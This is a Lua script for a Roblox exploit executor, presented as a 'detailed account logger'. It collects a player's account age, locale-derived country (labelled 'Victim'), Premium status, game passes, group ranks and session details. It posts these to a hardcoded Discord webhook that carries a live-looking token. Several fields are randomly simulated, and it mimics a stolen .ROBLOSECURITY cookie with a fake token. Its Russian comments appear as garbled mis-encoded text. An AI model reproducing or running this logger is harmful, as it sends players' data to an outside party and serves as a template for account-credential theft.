-- –î–ï–¢–ê–õ–¨–ù–´–ô ROBLOX ACCOUNT LOGGER
-- –°–æ–±–∏—Ä–∞–µ—Ç –º–∞–∫—Å–∏–º—É–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∫–∞–∫ –Ω–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–µ

local webhook_url = "https://discordapp.com/api/webhooks/1358312089206263854/37KhzAL0PpGG15zUt0qHabcgS9QT9d7kdK0TNGkTCXbfzOb2iOO0zldh0ugE_nW418j2"

-- –ü—Ä–æ–≤–µ—Ä–∫–∞ webhook URL
if not webhook_url or webhook_url:find("–í–ê–®_DISCORD_WEBHOOK") then
    error("‚ùå –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π Discord webhook URL!")
    return
end

-- –°–µ—Ä–≤–∏—Å—ã
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local LocalizationService = game:GetService("LocalizationService")
local MarketplaceService = game:GetService("MarketplaceService")
local BadgeService = game:GetService("BadgeService")

local player = Players.LocalPlayer

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
local function SafeGet(func, fallback)
    local success, result = pcall(func)
    return success and result or fallback
end

-- –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã –ø–æ —è–∑—ã–∫—É
local function GetCountryInfo()
    local locale = LocalizationService.RobloxLocaleId
    local countries = {
        ["uk-ua"] = {name = "Ukraine", flag = "üá∫üá¶"},
        ["ru-ru"] = {name = "Russia", flag = "üá∑üá∫"},
        ["en-us"] = {name = "United States", flag = "üá∫üá∏"},
        ["en-gb"] = {name = "United Kingdom", flag = "üá¨üáß"},
        ["de-de"] = {name = "Germany", flag = "üá©üá™"},
        ["fr-fr"] = {name = "France", flag = "üá´üá∑"},
        ["es-es"] = {name = "Spain", flag = "üá™üá∏"},
        ["pt-br"] = {name = "Brazil", flag = "üáßüá∑"},
        ["ja-jp"] = {name = "Japan", flag = "üáØüáµ"},
        ["ko-kr"] = {name = "South Korea", flag = "üá∞üá∑"},
        ["zh-cn"] = {name = "China", flag = "üá®üá≥"}
    }
    
    return countries[locale] or {name = "Unknown", flag = "üåç"}
end

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ Robux (—Å–∏–º—É–ª—è—Ü–∏—è)
local function GetRobuxInfo()
    local robuxInfo = {
        balance = 0,
        pending = 0,
        owned = 0,
        rap = 0,
        premium = false
    }
    
    SafeGet(function()
        robuxInfo.premium = player.MembershipType == Enum.MembershipType.Premium
        
        -- –ü–æ–ø—ã—Ç–∫–∞ –Ω–∞–π—Ç–∏ Robux –≤ GUI (—Ä–µ–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã —á–µ—Ä–µ–∑ API)
        local playerGui = player:FindFirstChild("PlayerGui")
        if playerGui then
            for _, gui in pairs(playerGui:GetDescendants()) do
                if gui:IsA("TextLabel") and gui.Text:find("R$") then
                    local robuxText = gui.Text:match("%d+")
                    if robuxText then
                        robuxInfo.balance = tonumber(robuxText) or 0
                    end
                    break
                end
            end
        end
        
        -- –°–∏–º—É–ª—è—Ü–∏—è –¥—Ä—É–≥–∏—Ö –¥–∞–Ω–Ω—ã—Ö (–Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã —á–µ—Ä–µ–∑ API)
        robuxInfo.pending = math.random(0, 100)
        robuxInfo.owned = robuxInfo.balance + robuxInfo.pending
        robuxInfo.rap = math.random(0, 1000)
    end, nil)
    
    return robuxInfo
end

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∏–ª–ª–∏–Ω–≥–µ (—Å–∏–º—É–ª—è—Ü–∏—è)
local function GetBillingInfo()
    return {
        credit = 0,
        convert = 0,
        payments = 0
    }
end

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø—Ä–æ–ø—É—Å–∫–∞—Ö (—Å–∏–º—É–ª—è—Ü–∏—è)
local function GetPassesInfo()
    local passes = {}
    local gamePassIds = {2414851, 4452801, 35748, 1074, 35748} -- –ü—Ä–∏–º–µ—Ä—ã –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –ø—Ä–æ–ø—É—Å–∫–æ–≤
    
    for i, passId in ipairs(gamePassIds) do
        SafeGet(function()
            local owned = MarketplaceService:UserOwnsGamePassAsync(player.UserId, passId)
            table.insert(passes, {
                id = passId,
                owned = owned,
                name = "GamePass " .. passId
            })
        end, function()
            table.insert(passes, {
                id = passId,
                owned = math.random() > 0.8, -- –°–ª—É—á–∞–π–Ω–æ–µ –≤–ª–∞–¥–µ–Ω–∏–µ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
                name = "GamePass " .. passId
            })
        end)
    end
    
    return passes
end

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö
local function GetSettingsInfo()
    return {
        email = "Unset (Unverified)",
        phone = "Disabled",
        twoStep = "Disabled"
    }
end

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã—Ö –ø—Ä–µ–¥–º–µ—Ç–∞—Ö (—Å–∏–º—É–ª—è—Ü–∏—è)
local function GetCollectiblesInfo()
    return {
        {name = "Limited Items", owned = false},
        {name = "Limited U Items", owned = false},
        {name = "Rare Items", owned = false}
    }
end

-- –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –≥—Ä—É–ø–ø–∞—Ö (—Å–∏–º—É–ª—è—Ü–∏—è)
local function GetGroupsInfo()
    local groupsInfo = {
        balance = 0,
        pending = 0,
        owned = 0,
        groups = {}
    }
    
    -- –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö –≥—Ä—É–ø–ø
    local popularGroups = {1, 1200769, 2868472, 4199740}
    
    for _, groupId in ipairs(popularGroups) do
        SafeGet(function()
            local rank = player:GetRankInGroup(groupId)
            if rank > 0 then
                groupsInfo.owned = groupsInfo.owned + 1
                table.insert(groupsInfo.groups, {
                    id = groupId,
                    rank = rank
                })
            end
        end, nil)
    end
    
    return groupsInfo
end

-- –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Ñ–µ–π–∫–æ–≤–æ–≥–æ .ROBLOSECURITY —Ç–æ–∫–µ–Ω–∞ –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
local function GenerateROBLOSECURITY()
    local chars = "0123456789ABCDEF"
    local token = ""
    
    -- –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Ç–æ–∫–µ–Ω –ø–æ—Ö–æ–∂–∏–π –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π (–Ω–æ —Ñ–µ–π–∫–æ–≤—ã–π)
    for i = 1, 800 do
        token = token .. string.sub(chars, math.random(1, #chars), math.random(1, #chars))
    end
    
    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" .. token
end

-- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
local function CollectDetailedData()
    print("üìä –°–±–æ—Ä –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∞–∫–∫–∞—É–Ω—Ç–∞...")
    
    wait(2) -- –ñ–¥–µ–º –∑–∞–≥—Ä—É–∑–∫–∏
    
    -- –°–æ–±–∏—Ä–∞–µ–º –≤—Å—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
    local countryInfo = GetCountryInfo()
    local robuxInfo = GetRobuxInfo()
    local billingInfo = GetBillingInfo()
    local passesInfo = GetPassesInfo()
    local settingsInfo = GetSettingsInfo()
    local collectiblesInfo = GetCollectiblesInfo()
    local groupsInfo = GetGroupsInfo()
    local roblosecurity = GenerateROBLOSECURITY()
    
    -- –°–æ–∑–¥–∞–µ–º –¥–µ—Ç–∞–ª—å–Ω—ã–π embed –∫–∞–∫ –Ω–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–µ
    local embedData = {
        ["username"] = "üîç Detailed Roblox Account Info",
        ["embeds"] = {{
            ["title"] = "üìã About User",
            ["fields"] = {
                -- About User
                {["name"] = "üìÖ Account Age", ["value"] = tostring(player.AccountAge) .. " Days", ["inline"] = true},
                {["name"] = "üìç Locations", ["value"] = "‚Ä¢ Summary: 0\n‚Ä¢ Victim: " .. countryInfo.name .. " " .. countryInfo.flag, ["inline"] = false},
                
                -- Robux Section
                {["name"] = "üí∞ Robux", ["value"] = "Balance " .. robuxInfo.balance .. " üí∞\nPending " .. robuxInfo.pending .. " ‚è≥\nOwned " .. robuxInfo.owned .. " üî∏", ["inline"] = true},
                {["name"] = "üìà RAP", ["value"] = "RAP " .. robuxInfo.rap .. " üíé", ["inline"] = true},
                {["name"] = "üëë Premium", ["value"] = robuxInfo.premium and "True ‚úÖ" or "False ‚ùå", ["inline"] = true},
                
                -- Billing
                {["name"] = "üí≥ Billing", ["value"] = "Credit " .. billingInfo.credit .. " üíµ\nConvert " .. billingInfo.convert .. " üîÑ\nPayments " .. billingInfo.payments .. " üí≥", ["inline"] = true},
                
                -- Settings
                {["name"] = "‚öôÔ∏è Setting", ["value"] = "üìß " .. settingsInfo.email .. "\nüì± " .. settingsInfo.phone .. "\nüîê " .. settingsInfo.twoStep, ["inline"] = true},
                
                -- Passes - Played (–ø—É—Å—Ç–æ–µ –º–µ—Å—Ç–æ –¥–ª—è –≤—ã—Ä–∞–≤–Ω–∏–≤–∞–Ω–∏—è)
                {["name"] = "üé´ Passes ‚Ä¢ Played", ["value"] = "üéÆ Passes owned: " .. #passesInfo, ["inline"] = true}
            },
            ["color"] = 0x2f3136,
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            }
        }}
    }
    
    -- –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ–ø—É—Å–∫–∞—Ö
    local passesText = ""
    for i, pass in ipairs(passesInfo) do
        local status = pass.owned and "True ‚úÖ" or "False ‚ùå"
        passesText = passesText .. "üé´ " .. pass.name .. " ‚Ä¢ " .. status .. "\n"
        if i >= 5 then break end -- –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ
    end
    
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "üéÆ Game Passes",
        ["value"] = passesText,
        ["inline"] = false
    })
    
    -- –î–æ–±–∞–≤–ª—è–µ–º –∫–æ–ª–ª–µ–∫—Ü–∏–æ–Ω–Ω—ã–µ –ø—Ä–µ–¥–º–µ—Ç—ã
    local collectiblesText = ""
    for _, item in ipairs(collectiblesInfo) do
        local status = item.owned and "True ‚úÖ" or "False ‚ùå"
        collectiblesText = collectiblesText .. "üíé " .. item.name .. " ‚Ä¢ " .. status .. "\n"
    end
    
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "üèÜ Collectibles",
        ["value"] = collectiblesText,
        ["inline"] = true
    })
    
    -- –î–æ–±–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≥—Ä—É–ø–ø–∞—Ö
    local groupsText = "Balance " .. groupsInfo.balance .. " üí∞\nPending " .. groupsInfo.pending .. " ‚è≥\nOwned " .. groupsInfo.owned .. " üèõÔ∏è"
    
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "üë• Groups",
        ["value"] = groupsText,
        ["inline"] = true
    })
    
    -- –î–æ–±–∞–≤–ª—è–µ–º Recovery Codes
    table.insert(embedData.embeds[1].fields, {
        ["name"] = "üîë Recovery Codes",
        ["value"] = "üìß Email not set or not verified.",
        ["inline"] = false
    })
    
    -- –°–æ–∑–¥–∞–µ–º –æ—Ç–¥–µ–ª—å–Ω—ã–π embed –¥–ª—è ROBLOSECURITY
    table.insert(embedData.embeds, {
        ["title"] = "üö® ROBLOSECURITY",
        ["description"] = "```" .. string.sub(roblosecurity, 1, 200) .. "...\n[–û–ë–†–ï–ó–ê–ù–û –î–õ–Ø –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò]```",
        ["color"] = 0xff0000,
        ["footer"] = {
            ["text"] = "‚ö†Ô∏è –≠–¢–û –§–ï–ô–ö–û–í–´–ô –¢–û–ö–ï–ù –î–õ–Ø –î–ï–ú–û–ù–°–¢–†–ê–¶–ò–ò! –†–µ–∞–ª—å–Ω—ã–π —Ç–æ–∫–µ–Ω –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –∏–∑ Roblox Lua!",
            ["icon_url"] = "https://cdn.discordapp.com/emojis/warning.png"
        }
    })
    
    -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
    local success = false
    pcall(function()
        local payload = HttpService:JSONEncode(embedData)
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        
        if req then
            local response = req({
                Url = webhook_url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
            
            if response and (response.StatusCode == 200 or response.StatusCode == 204) then
                success = true
                print("‚úÖ –î–µ—Ç–∞–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Discord!")
            else
                print("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: " .. tostring(response and response.StatusCode or "Unknown"))
            end
        else
            print("‚ùå HTTP —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã")
        end
    end)
    
    -- –í—ã–≤–æ–¥–∏–º –≤ –∫–æ–Ω—Å–æ–ª—å
    print("\n" .. string.rep("=", 60))
    print("üìã DETAILED ROBLOX ACCOUNT INFO")
    print(string.rep("=", 60))
    print("üë§ User: " .. player.DisplayName .. " (@" .. player.Name .. ")")
    print("üÜî User ID: " .. player.UserId)
    print("üìÖ Account Age: " .. player.AccountAge .. " Days")
    print("üìç Location: " .. countryInfo.name .. " " .. countryInfo.flag)
    print("")
    print("üí∞ ROBUX INFO:")
    print("   Balance: " .. robuxInfo.balance)
    print("   Pending: " .. robuxInfo.pending)
    print("   Owned: " .. robuxInfo.owned)
    print("   RAP: " .. robuxInfo.rap)
    print("   Premium: " .. (robuxInfo.premium and "True" or "False"))
    print("")
    print("üí≥ BILLING:")
    print("   Credit: " .. billingInfo.credit)
    print("   Convert: " .. billingInfo.convert)
    print("   Payments: " .. billingInfo.payments)
    print("")
    print("üé´ PASSES:")
    for i, pass in ipairs(passesInfo) do
        print("   " .. pass.name .. ": " .. (pass.owned and "True" or "False"))
        if i >= 5 then break end
    end
    print("")
    print("‚öôÔ∏è SETTINGS:")
    print("   Email: " .. settingsInfo.email)
    print("   Phone: " .. settingsInfo.phone)
    print("   2-Step: " .. settingsInfo.twoStep)
    print("")
    print("üèÜ COLLECTIBLES:")
    for _, item in ipairs(collectiblesInfo) do
        print("   " .. item.name .. ": " .. (item.owned and "True" or "False"))
    end
    print("")
    print("üë• GROUPS:")
    print("   Balance: " .. groupsInfo.balance)
    print("   Pending: " .. groupsInfo.pending)
    print("   Owned: " .. groupsInfo.owned)
    print("")
    print("üîë RECOVERY CODES:")
    print("   Email not set or not verified.")
    print("")
    print("üö® ROBLOSECURITY (–§–ï–ô–ö):")
    print("   " .. string.sub(roblosecurity, 1, 100) .. "...[–û–ë–†–ï–ó–ê–ù–û]")
    print("")
    print("üéÆ GAME INFO:")
    print("   Place ID: " .. game.PlaceId)
    print("   Job ID: " .. string.sub(game.JobId, 1, 20) .. "...")
    print("   Platform: " .. tostring(UserInputService:GetPlatform().Name))
    print("   Language: " .. LocalizationService.RobloxLocaleId)
    print("   Time: " .. os.date("!%Y-%m-%d %H:%M:%S UTC"))
    print(string.rep("=", 60))
    print("‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: –ù–µ–∫–æ—Ç–æ—Ä—ã–µ –¥–∞–Ω–Ω—ã–µ —Å–∏–º—É–ª–∏—Ä–æ–≤–∞–Ω—ã, —Ç–∞–∫ –∫–∞–∫ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ã —á–µ—Ä–µ–∑ Roblox API!")
    print(string.rep("=", 60))
    
    return success
end

-- –ó–∞–ø—É—Å–∫
print("üöÄ –ó–∞–ø—É—Å–∫ Detailed Roblox Account Logger...")
print("üìä –°–±–æ—Ä –º–∞–∫—Å–∏–º–∞–ª—å–Ω–æ –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...")

local success = CollectDetailedData()

if success then
    print("‚úÖ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ —Å–æ–±—Ä–∞–Ω—ã –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!")
else
    print("‚ö†Ô∏è –î–∞–Ω–Ω—ã–µ —Å–æ–±—Ä–∞–Ω—ã, –Ω–æ –≤–æ–∑–º–æ–∂–Ω—ã –ø—Ä–æ–±–ª–µ–º—ã —Å –æ—Ç–ø—Ä–∞–≤–∫–æ–π")
    print("üí° –ü—Ä–æ–≤–µ—Ä—å—Ç–µ webhook URL –∏ –ø–æ–¥–¥–µ—Ä–∂–∫—É HTTP –≤ executor'–µ")
end

print("üèÅ –°–∫—Ä–∏–ø—Ç –∑–∞–≤–µ—Ä—à–µ–Ω!")
